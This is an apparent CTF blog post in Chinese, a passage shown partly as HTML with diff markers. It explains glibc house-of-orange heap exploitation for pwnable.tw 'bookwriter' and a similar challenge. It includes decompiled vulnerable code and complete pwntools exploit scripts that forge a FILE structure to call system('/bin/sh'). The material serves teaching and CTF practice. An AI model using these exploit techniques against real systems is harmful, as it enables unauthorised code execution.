p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_flush_str_jumps</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin4file_size</span></span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr<span class="number">-0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                       )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr<span class="number">-8</span>)  <span class="comment"># vtable</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io_str_jumps_offset</span><span class="params">(libc)</span>:</span></span><br><span class="line">    IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line">    <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">        possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">            <span class="comment"># print possible_IO_str_jumps_offset</span></span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange_payload</span><span class="params">(libc, libc_base)</span>:</span></span><br><span class="line">  io_str_jump = libc_base + get_io_str_jumps_offset(libc)</span><br><span class="line">  io_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">  system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">  bin_sh = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">  payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)</span><br><span class="line">  <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice : "</span>,<span class="string">'1'</span>)</span><br><span class="line">	sla(<span class="string">"name :"</span>,str(size))</span><br><span class="line">	sda(<span class="string">"Name :"</span>,name)</span><br><span class="line">	sla(<span class="string">"Orange:"</span>,str(price))</span><br><span class="line">	sla(<span class="string">"Orange:"</span>,str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">	sla(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">	sla(<span class="string">"name :"</span>,str(size))</span><br><span class="line">	sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">	sla(<span class="string">"Orange: "</span>,str(price))</span><br><span class="line">	sla(<span class="string">"Orange: "</span>,str(color))</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x28</span>,<span class="string">'R4bb1t'</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pay = <span class="number">0x28</span>*<span class="string">'\x00'</span> + p64(<span class="number">0x21</span>) + <span class="number">0x18</span>*<span class="string">'\x00'</span> + p64(<span class="number">0xf91</span>)</span><br><span class="line">upgrade(<span class="number">0x100</span>,pay,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">build(<span class="number">0xf90</span>,<span class="string">'n0va'</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">build(<span class="number">8</span>,<span class="string">'a'</span>,<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">see()</span><br><span class="line">ru(<span class="string">"house : "</span>)</span><br><span class="line">main_arena = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-65</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.warn(<span class="string">"libc_base --&gt; %s"</span>,hex(libc_base))</span><br><span class="line">pay = house_of_orange_payload(libc,libc_base)</span><br><span class="line"><span class="comment"># debug(0x1119)</span></span><br><span class="line">upgrade(<span class="number">0x1000</span>,<span class="number">0x30</span>*<span class="string">'\x00'</span> + pay,<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(0xd68)</span></span><br><span class="line">sla(<span class="string">"choice : "</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="bookwriter-–-pwnable-tw"><a href="#bookwriter-–-pwnable-tw" class="headerlink" title="bookwriter – pwnable.tw"></a>bookwriter – pwnable.tw</h2><p>一样是用到house_of_orange</p>
+<p>程序同样没有free功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">      BookWriter      </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add a page        </span><br><span class="line"> 2. View a page       </span><br><span class="line"> 3. Edit a page       </span><br><span class="line"> 4. Information       </span><br><span class="line"> 5. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure></p>
+<p><code>Information</code>功能可以泄漏堆地址，可用也可不用，因为’/bin/sh\x00’也可以直接用libc地址</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>首先，自己实现的read函数没有0截断<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = _read_chk(<span class="number">0L</span>L, a1, a2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v3 - <span class="number">1L</span>L + a1) == <span class="number">10</span> )<span class="comment">// 如果不输入回车就没有0截断</span></span><br><span class="line">    *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v3 - <span class="number">1L</span>L + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>edit函数中每次都会更新size，通过strlen，结合<code>my_read</code>没有0截断的情况，这里存在溢出可以修改到下一个chunk的size<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index of page :"</span>);</span><br><span class="line">  v1 = sub_4008CD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"out of page:"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6020A0[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Not found !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content:"</span>);</span><br><span class="line">  my_read((__int64)qword_6020A0[v1], qword_6020E0[v1]);<span class="comment">// 这里没有0截断</span></span><br><span class="line">  qword_6020E0[v1] = <span class="built_in">strlen</span>(qword_6020A0[v1]);  <span class="comment">// 结合上面的没有0截断，这里存在溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>add函数中，两个全局变量，<code>0x6020A0</code>存在堆指针，相邻的<code>0x6020E0</code>存在size，且<code>0x6020a0-&gt;0x6020e0 is 0x40 bytes (0x8 words)</code>也就是可以存放8个堆指针，但是add函数中到堆块的约束条件是<code>i&gt;8 &amp;&amp; !qword_6020A0[i]</code>，也就是可以申请第9个，只要这个时候<code>qword_6020A0[8] == 0</code>也就是<code>0x6020E0 == 0</code>，这样，0号堆块的size位就被放上了一个堆地址，这样就造成了堆溢出</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、通过edit中的溢出修改top_chunk的size，house_of_orange得到一块<code>main_arena</code>进行泄漏地址<br>2、利用0号块的size溢出构造FSOP攻击<br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	p = process(<span class="string">'./bookwriter'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./bookwriter'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10304"</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./bookwriter'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc_64.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_flush_str_jumps</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin4file_size</span></span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr<span class="number">-0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                       )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr<span class="number">-8</span>)  <span class="comment"># vtable</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io_str_jumps_offset</span><span class="params">(libc)</span>:</span></span><br><span class="line">    IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line">    <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">        possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">            <span class="comment"># print possible_IO_str_jumps_offset</span></span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange_payload</span><span class="params">(libc, libc_base)</span>:</span></span><br><span class="line">  io_str_jump = libc_base + get_io_str_jumps_offset(libc)</span><br><span class="line">  io_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">  system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">  bin_sh = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">  payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)</span><br><span class="line">  <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author</span><span class="params">(name)</span>:</span></span><br><span class="line">	sla(<span class="string">"Author :"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,message=<span class="string">''</span>)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice :"</span>,<span class="string">'1'</span>)</span><br><span class="line">	sla(<span class="string">"page :"</span>,str(size))</span><br><span class="line">	<span class="keyword">if</span> size:</span><br><span class="line">		sda(<span class="string">"Content :"</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice :"</span>,<span class="string">'2'</span>)</span><br><span class="line">	sla(<span class="string">"page :"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,message)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line">	sla(<span class="string">"page :"</span>,str(idx))</span><br><span class="line">	sla(<span class="string">"Content:"</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_heap</span><span class="params">()</span>:</span></span><br><span class="line">	sla(<span class="string">"choice :"</span>,<span class="string">'4'</span>)</span><br><span class="line">	ru(<span class="number">0x40</span>*<span class="string">'a'</span>)</span><br><span class="line">	res = u64(ru(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	sla(<span class="string">") "</span>,str(<span class="number">0</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">author(<span class="number">0x40</span>*<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">0x18</span>*<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>*<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>*<span class="string">'a'</span> + <span class="string">'\xe1\x0f\x00'</span>)</span><br><span class="line">heap_addr = link_heap()<span class="number">-0x10</span></span><br><span class="line">log.warn(<span class="string">"heap_addr --&gt; %s"</span>,hex(heap_addr))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0x18</span>,<span class="string">'b'</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">"Content :\n"</span>)</span><br><span class="line">main_arena = u64(ru(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-66</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">log.warn(<span class="string">"libc_base --&gt; %s"</span>,hex(libc_base))</span><br><span class="line"></span><br><span class="line">pay = house_of_orange_payload(libc,libc_base)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pay = 0x110*'\x00'</span></span><br><span class="line"><span class="string">pay += '/bin/sh\x00'</span></span><br><span class="line"><span class="string">pay += p64(0x61) + p64(main_arena+88)</span></span><br><span class="line"><span class="string">pay += p64(IO_list_all-0x10)</span></span><br><span class="line"><span class="string">pay += p64(2) + p64(3)</span></span><br><span class="line"><span class="string">pay += p64(0)*9</span></span><br><span class="line"><span class="string">pay += p64(system)</span></span><br><span class="line"><span class="string">pay += p64(0)*11</span></span><br><span class="line"><span class="string">pay += p64(heap_addr+0x180)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># gdb.attach(p,"b *0x4009FE")</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x110</span>*<span class="string">'\x00'</span> + pay)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>house_of_orange攻击有一定概率失败，主要原因是在Bypass时，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>由于第一次将<code>_IO_list_all</code>支持到main_arena时，main_arena不可控，该内存随机，所以有时(fp-&gt;_mode&lt;=0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base)结果 为0，造成执行_IO_overflow(fp,EOF) == EOF调用未知vtable错误地址，程序 abort，所以程序有一定的失败率</p>
+</blockquote>
+<p>参考资料：<br><a href="https://bbs.pediy.com/thread-222718.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222718.htm</a><br><a href="https://tac1t0rnx.space/2018/01/10/house-of-orange/" target="_blank" rel="noopener">https://tac1t0rnx.space/2018/01/10/house-of-orange/</a><br><a href="https://wiki.x10sec.org/pwn/heap/house_of_orange/" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/house_of_orange/</a><br><a href="http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/" target="_blank" rel="noopener">http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/14/Hitcon-Training(下)/" rel="next" title="Hitcon-Training lab10~lab15">
+                <i class="fa fa-chevron-left"></i> Hitcon-Training lab10~lab15
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/14/how2heap系列/" rel="prev" title="hctf2016-fheap">
+                hctf2016-fheap <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
